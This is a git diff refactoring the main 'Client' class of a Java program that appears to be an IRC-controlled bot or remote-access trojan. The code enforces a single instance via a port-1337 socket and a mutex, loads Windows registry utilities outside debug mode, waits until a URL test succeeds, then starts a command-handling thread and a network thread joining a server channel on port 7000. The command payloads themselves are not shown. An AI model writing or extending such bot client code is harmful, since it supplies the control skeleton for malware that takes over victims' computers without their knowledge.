@@ -5,46 +5,73 @@ import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.SocketException;
 
-import syn.net.NetworkThread;
+import syn.threads.CmdThread;
+import syn.threads.NetworkThread;
 import syn.utils.FileUtils;
 import syn.utils.Settings;
+import syn.utils.Utilities;
 import syn.utils.mutex.Mutex;
 import syn.utils.reg.RegUtils;
 
-@SuppressWarnings("unused")
 public class Client {
 	
-	private Mutex mu;
-	private RegUtils ru;
-	private static FileUtils fu;
-	private static NetworkThread nt;
-	private static CmdThread cmd;
-	public static ServerSocket dupePrevent;
-	public static boolean connected = false;
-	public static String os;
+	private static Client client;
 	
-	public Client(String server, String channel, int port) {
+	public Mutex mu;
+	public RegUtils regUtils;
+	public FileUtils fileUtils;
+	public NetworkThread networkThread;
+	public CmdThread cmdThread;
+	public ServerSocket dupePrevent;
+	public boolean connected = false;
+	public String status;
+	public Utilities uc;
+	public String mutexStr;
+	public String serial;
+	public String os;
+	
+	public static void main(String[] args) {
+		System.setProperty("java.net.preferIPv4Stack", "true");
+		try {
+			while(true) {
+				if(Utilities.testURL()) {
+					client = new Client();
+					client.initialize();
+					break;
+				}
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+	
+	public static Client getInstance() {
+		return client;
+	}
+	
+	public Client() {
 		checkLockSock();
-		Utilities uc = new Utilities();
+	}
+	
+	private void initialize() {
 		os = System.getProperty("os.name");
 		mu = new Mutex();
+		uc = new Utilities();
 		if(uc.procOS(os).equals("WIN")) {
 			if(!Settings.debugMode) {
-				ru = new RegUtils();
-				fu = new FileUtils();
+				regUtils = new RegUtils();
+				fileUtils = new FileUtils();
 			}
 		}
-		try {
-			//Make Command Thread
-			cmd = new CmdThread();
-			Thread cmdth = new Thread(cmd);
-			cmdth.start();
-			
-			//Make Network Thread
-			nt = new NetworkThread(server, channel, port);
-			Thread nth = new Thread(nt);
-			nth.start();
-		} catch (Exception e) { e.printStackTrace(); }
+		//Make Command Thread
+		cmdThread = new CmdThread();
+		Thread cmdth = new Thread(cmdThread);
+		cmdth.start();
+		
+		//Make Network Thread
+		networkThread = new NetworkThread(Settings.server, Settings.channel, 7000);
+		Thread nth = new Thread(networkThread);
+		nth.start();
 	}
 	
 	private void checkLockSock() {
@@ -52,17 +79,5 @@ public class Client {
 			dupePrevent = new ServerSocket();
 			dupePrevent.bind(new InetSocketAddress(1337));
 		} catch (SocketException e) { System.exit(0); } catch (IOException e) {}
-	}
-
-	public static FileUtils getFileUtils() {
-		return fu;
-	}
-	
-	public static NetworkThread getNetworkThread() {
-		return nt;
-	}
-	
-	public static CmdThread getCmdThread() {
-		return cmd;
 	}
 }
